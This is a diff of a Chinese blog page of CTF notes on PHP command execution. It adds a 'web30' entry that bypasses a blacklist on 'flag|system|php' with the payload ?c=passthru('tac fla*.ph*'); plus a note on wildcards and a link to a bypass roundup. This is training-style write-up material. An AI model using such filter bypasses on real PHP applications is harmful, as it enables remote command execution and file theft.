@@ -27,7 +27,7 @@
 <meta property="og:description" content="命令执行常见函数：12345678system()    &#x2F;&#x2F; 执行外部程序并显示输出exec()      &#x2F;&#x2F; 执行外部程序passthru()  &#x2F;&#x2F; 执行外部程序并显示原始输出shell_exec() &#x2F;&#x2F; 通过shell执行命令&#96;&#96; &#96;&#96;(反引号)    &#x2F;&#x2F; 执行shell命令popen()     &#x2F;&#x2F; 打开进程文件指针proc_open() &#x2F;&#x2F; 执行命令并打开文件指针    常用">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-06-09T15:00:01.000Z">
-<meta property="article:modified_time" content="2025-06-09T17:22:46.763Z">
+<meta property="article:modified_time" content="2025-06-10T17:14:20.418Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          813 字
+          871 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          7 分钟
+          8 分钟
         
       </span>
     
@@ -340,6 +340,15 @@
 <p>输出顺序：</p>
 <figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span></span><span class="language-xml">  // PHP引擎执行，可能抑制输出</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>        // 浏览器开始解析</span><br><span class="language-xml">...</span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- flag --&gt;</span> // 可能被隐藏</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 
+
+
+<h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p><em>!preg_match(“&#x2F;flag|system|php&#x2F;i”, $c</em></p>
+<p>用<strong>passthru</strong>代替<strong>system</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;tac fla*.ph*&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>通配符：?匹配单个字符，*匹配任何数量字符，可以是0</p>
+<p>web31</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51213906/article/details/123010661">PHP-RCE绕过的姿势总结_rce如何绕过对system的过滤-CSDN博客</a></p>
 
                 
               </div>
